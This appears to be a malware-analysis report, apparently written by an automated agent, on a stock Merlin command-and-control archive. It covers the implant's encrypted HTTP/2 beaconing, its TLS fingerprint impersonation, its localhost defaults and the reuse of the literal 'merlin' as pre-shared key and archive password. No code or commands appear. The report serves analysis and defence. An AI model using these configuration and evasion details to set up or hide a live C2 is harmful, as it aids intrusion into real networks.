Merlin is a **stock, unmodified upstream Ne0nd0g/merlin release**, and the archive's protection was a **published vendor default**, not a secret. The implant is a hardened Go beacon: HTTP/2 transport, OPAQUE aPAKE check-in, a JWE/gob/Base64 pipeline with AES-GCM content encryption and a real PSK-vs-ECDH/RSA split, fixed 4096-byte padding, 30 s beacon with ±3 s skew, and — uniquely in this corpus — **uTLS browser impersonation that rewrites the TLS ClientHello to match a named Chrome/Firefox/Safari/Edge build at the JA3/JA4 level.**

The two operational facts that matter most for anyone reasoning about a Merlin deployment:

1. **Every default is `127.0.0.1`** and `secure=false`. The shipped agent as-built points at localhost and does not verify TLS. It is a template, not a live implant — real operators must re-link with their own `main.addr` / `main.psk` / `main.url`, which is exactly why the release ships a `-ldflags` builder workflow instead of a configured agent.
2. **`main.psk=merlin` is the same literal as the archive password and the server RPC default.** An operator who deploys without overriding both is running a C2 whose pre-shared key is in the public documentation, under a framework whose TLS fingerprinting would otherwise make it hard to see.

The bundled payload is overwhelmingly **PowerShell modules (32 of 63)** plus C#, Go in-memory loaders, and a cross-platform agent matrix. The absence of `.ps1` bodies, certificates, and any database confirms this is a **distribution package, not a configured or previously-deployed instance**.

---

*Report written by `archive-diver` for task-6. Evidence tags: `[binary]`, `[binary-debug]`, `[module-source]`, `[external-research]`, `[inference]`. All binary claims are read from the extracted PEs at `RE_Library/07_OUTPUT/extractions/T8/extracted/`; all archive claims are read from the 7z start header and `7z t` output; upstream claims are cited to `github.com/Ne0nd0g/merlin`.*
